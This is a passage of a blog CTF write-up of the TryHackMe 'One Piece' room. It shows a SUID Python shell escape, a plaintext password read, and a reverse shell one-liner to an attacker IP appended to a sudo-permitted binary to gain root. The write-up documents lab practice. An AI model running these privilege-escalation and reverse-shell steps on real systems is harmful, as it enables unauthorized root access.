+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/usr/bin/pkexec
+</span></span><span style="display:flex;"><span>/usr/bin/traceroute6.iputils
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/usr/bin/gomugomunooo_king_kobraaa
+</span></span><span style="display:flex;"><span>/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/usr/bin/arping
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>M0nk3y_D_7uffy@Laugh-Tale:~$ gomugomunooo_king_kobraaa
+</span></span><span style="display:flex;"><span>Python 3.6.9 <span style="color:#f92672">(</span>default, Jul <span style="color:#ae81ff">17</span> 2020, 12:50:27<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>GCC 8.4.0<span style="color:#f92672">]</span> on linux
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;help&#34;</span>, <span style="color:#e6db74">&#34;copyright&#34;</span>, <span style="color:#e6db74">&#34;credits&#34;</span> or <span style="color:#e6db74">&#34;license&#34;</span> <span style="color:#66d9ef">for</span> more information.
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; 
+</span></span></code></pre></div><p>Lol it&rsquo;s basically python! let&rsquo;s ask gtfobins</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt;&gt;&gt; import os; os.execl<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#e6db74">&#34;-p&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$ whoami
+</span></span><span style="display:flex;"><span>7uffy_vs_T3@ch
+</span></span><span style="display:flex;"><span>$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>M0nk3y_D_7uffy<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>luffy<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>7uffy_vs_T3@ch<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>luffy<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$ ls /home
+</span></span><span style="display:flex;"><span>luffy  teach
+</span></span><span style="display:flex;"><span>$ cd /home/teach
+</span></span><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>luffy_vs_teach.txt
+</span></span><span style="display:flex;"><span>$ cat luffy_vs_teach.txt
+</span></span><span style="display:flex;"><span>This fight will determine who can take the One Piece and who will be the next Pirate King.
+</span></span><span style="display:flex;"><span>These <span style="color:#ae81ff">2</span> monsters have a matchless will and none of them can let the other prevail.
+</span></span><span style="display:flex;"><span>Each of them have the same dream, be the Pirate King.
+</span></span><span style="display:flex;"><span>For one it means: Take over the World.
+</span></span><span style="display:flex;"><span>For the other: Be the freest man in the World.
+</span></span><span style="display:flex;"><span>Each of their hit creates an earthquake felt on the entire island.
+</span></span><span style="display:flex;"><span>But in the end, Luffy thanks to his willpower won the fight.
+</span></span><span style="display:flex;"><span>Now, he needs to find the One Piece.
+</span></span><span style="display:flex;"><span>$ ls -al
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">56</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">7</span> 7uffy_vs_T3@ch teach <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">4</span> root           root  <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> ..
+</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> 7uffy_vs_T3@ch teach  <span style="color:#ae81ff">334</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> .ICEauthority
+</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> 7uffy_vs_T3@ch teach    <span style="color:#ae81ff">1</span> Aug <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2020</span> .bash_history
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> 7uffy_vs_T3@ch teach  <span style="color:#ae81ff">220</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> 7uffy_vs_T3@ch teach <span style="color:#ae81ff">3771</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> .bashrc
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">11</span> 7uffy_vs_T3@ch teach <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> .cache
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">11</span> 7uffy_vs_T3@ch teach <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> .config
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">3</span> 7uffy_vs_T3@ch teach <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> .gnupg
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">3</span> 7uffy_vs_T3@ch teach <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> .local
+</span></span><span style="display:flex;"><span>-r--------  <span style="color:#ae81ff">1</span> 7uffy_vs_T3@ch teach   <span style="color:#ae81ff">37</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> .password.txt
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> 7uffy_vs_T3@ch teach  <span style="color:#ae81ff">807</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> .profile
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">2</span> 7uffy_vs_T3@ch teach <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> .ssh
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> 7uffy_vs_T3@ch teach    <span style="color:#ae81ff">0</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> .sudo_as_admin_successful
+</span></span><span style="display:flex;"><span>-r--------  <span style="color:#ae81ff">1</span> 7uffy_vs_T3@ch teach  <span style="color:#ae81ff">479</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> luffy_vs_teach.txt
+</span></span><span style="display:flex;"><span>$ cat .password.txt
+</span></span><span style="display:flex;"><span>7uffy_vs_T3@ch:Wh0_w1ll_b3_th3_k1ng?
+</span></span></code></pre></div><p>Ah yes <code>willpower</code>&hellip;that&rsquo;s useful indeed</p>
+<p>Now we can try privesc basics again&hellip;I highly suspect sudo to work this time</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ su 7uffy_vs_T3@ch
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span>7uffy_vs_T3@ch@Laugh-Tale:~$ sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> 7uffy_vs_T3@ch: 
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> 7uffy_vs_T3@ch on Laugh-Tale:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User 7uffy_vs_T3@ch may run the following commands on Laugh-Tale:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> /usr/local/bin/less
+</span></span><span style="display:flex;"><span>7uffy_vs_T3@ch@Laugh-Tale:~$ 
+</span></span></code></pre></div><p>less? really? now we can read stuff?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>7uffy_vs_T3@ch@Laugh-Tale:~$ sudo less /root/flag.txt
+</span></span><span style="display:flex;"><span>Sorry, I can<span style="color:#960050;background-color:#1e0010">&#39;</span>t tell you where is the One Piece
+</span></span></code></pre></div><p>sike&hellip;they got me! After &ldquo;looking it up&rdquo; we learn that less can be used to execute commands</p>
+<p>funny how&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>7uffy_vs_T3@ch@Laugh-Tale:~$  echo <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.8.4.19/4444 0&gt;&amp;1&#39;</span> &gt;&gt; /usr/local/bin/less
+</span></span><span style="display:flex;"><span>7uffy_vs_T3@ch@Laugh-Tale:~$ sudo less
+</span></span><span style="display:flex;"><span>Sorry, I can<span style="color:#960050;background-color:#1e0010">&#39;</span>t tell you where is the One Piece
+</span></span></code></pre></div><p>and on the listenner we have this&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─<span style="color:#f92672">(</span>15:43:40<span style="color:#f92672">)</span>──&gt; nc -lnvp <span style="color:#ae81ff">4444</span>                                                                                                        ──<span style="color:#f92672">(</span>mar.,janv.16<span style="color:#f92672">)</span>─┘
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.8.4.19<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.80.106<span style="color:#f92672">]</span> <span style="color:#ae81ff">53462</span>
+</span></span><span style="display:flex;"><span>root@Laugh-Tale:~# id
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>We did it boys! We can grab the one piece now</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@Laugh-Tale:/root# ls -al
+</span></span><span style="display:flex;"><span>ls -al
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">36</span>
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">5</span> root root <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">24</span> root root <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> ..
+</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">217</span> Aug <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2020</span> .bash_history
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">3106</span> Apr  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2018</span> .bashrc
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2020</span> .cache
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> .gnupg
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> .local
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">148</span> Aug <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2015</span> .profile
+</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">0</span> Jul <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> .python_history
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">172</span> Jul <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> .wget-hst
+</span></span></code></pre></div><p>Actually&hellip;no! I hate this room&hellip;I hate it so much</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@Laugh-Tale:~# find / -name <span style="color:#e6db74">&#34;*.txt&#34;</span> -user root
+</span></span><span style="display:flex;"><span>find / -name <span style="color:#e6db74">&#34;*.txt&#34;</span> -user root
+</span></span><span style="display:flex;"><span>/snap/gnome-3-34-1804/36/etc/X11/rgb.txt
+</span></span><span style="display:flex;"><span>/snap/gnome-3-34-1804/36/usr/lib/python2.7/LICENSE.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/usr/share/gnupg/help.ru.txt
+</span></span><span style="display:flex;"><span>/usr/share/cups/doc-root/robots.txt
+</span></span><span style="display:flex;"><span>/usr/share/mysterious/on3_p1ec3.txt
+</span></span><span style="display:flex;"><span>/usr/share/ibus-table/tables/template.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@Laugh-Tale:~# cat /usr/share/mysterious/on3_p1ec3.txt
+</span></span><span style="display:flex;"><span>cat /usr/share/mysterious/on3_p1ec3.txt
+</span></span><span style="display:flex;"><span>One Piece: Od@_wOnt_l3t_yOu_kn0w
+</span></span></code></pre></div><p><img src="http://localhost:1313/thm/One%20Piece/boat.png" alt="boat"></p>
+<p>finally we found it, the <strong>One Piece</strong>!!</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="http://localhost:1313/categories/tryhackme/">TryHackMe</a></span>
+        
+    </p>
+
+			    <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit"><circle cx="12" cy="12" r="4"></circle><line x1="1.05" y1="12" x2="7" y2="12"></line><line x1="17.01" y1="12" x2="22.96" y2="12"></line></svg><a href="https://github.com/nair0lf32/zer0ne-blog3ea6cd49a6d64f0d2ae78ea0154477712891a42e" target="_blank" rel="noopener">3ea6cd4</a> @ 2024-01-31</p>
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2024</span>
+            <span><a href="http://localhost:1313/">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="http://localhost:1313/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="http://localhost:1313/bundle.min.b1dc444a7108174ae3d2294f982be5e99e844ae2b8d58eeea19d929bde0338be4d12ed8a4dfc67194dcc6726fa6a82705119c0d7e4edd4de9294be6535ea7b7f.js" integrity="sha512-sdxESnEIF0rj0ilPmCvl6Z6ESuK41Y7uoZ2Sm94DOL5NEu2KTfxnGU3MZyb6aoJwURnA1&#43;Tt1N6SlL5lNep7fw=="></script>
+
+
+
+    </body>
+</html>
